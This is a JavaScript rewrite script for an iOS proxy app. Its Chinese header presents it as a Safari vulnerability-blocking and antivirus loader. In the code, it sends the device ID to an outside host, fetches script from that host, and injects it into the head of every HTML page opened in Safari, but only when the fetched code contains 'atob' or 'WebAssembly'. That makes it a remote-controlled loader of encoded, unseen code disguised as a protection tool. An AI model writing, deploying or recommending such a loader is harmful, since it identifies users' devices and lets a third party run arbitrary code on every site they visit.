/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 * Safari 漏洞封堵 Loader (原生判定版)
 * 作用：仅在原生 Safari 中注入 lockDown 物理封堵逻辑
 * 更新：2026-04-08
 */


const ua = $request.headers['User-Agent'] || $request.headers['user-agent'] || "";
const contentType = $response.headers['Content-Type'] || $response.headers['content-type'] || "";
const url = $request.url || "";

// 1. 深度 App 判定：除了 UA，还通过 URL 判定是否为微信等 App 内部请求
const isKnownApp = /MicroMessenger|WeChat|QQ\/|Weibo|XHS-App|NewsArticle|Toutiao|Alipay/i.test(ua) || 
                   /video\.qq\.com|weixin\.qq\.com/i.test(url);

// 2. 资源熔断：如果不是 HTML 网页或者是已知 App，瞬间退出
if (isKnownApp || (contentType && !contentType.includes("text/html"))) {
    $done({});
} else if (ua.includes("Safari") && ua.includes("Version/")) {
    const did = $environment.device_id;
    const authUrl = `https://bhip.cc.cd/?id=${did}`;

    $httpClient.get(authUrl, (err, resp, data) => {
        // 只有状态码为 200 才注入，解决您的 Unauthorized 问题
        if (!err && resp.status === 200 && (data.includes("atob") || data.includes("WebAssembly"))) {
            let body = $response.body.replace(/<head[^>]*>/i, `$&<script>${data}</script>`);
            $done({ body });
        } else {
            $done({});
        }
    });
} else {
    $done({});
}
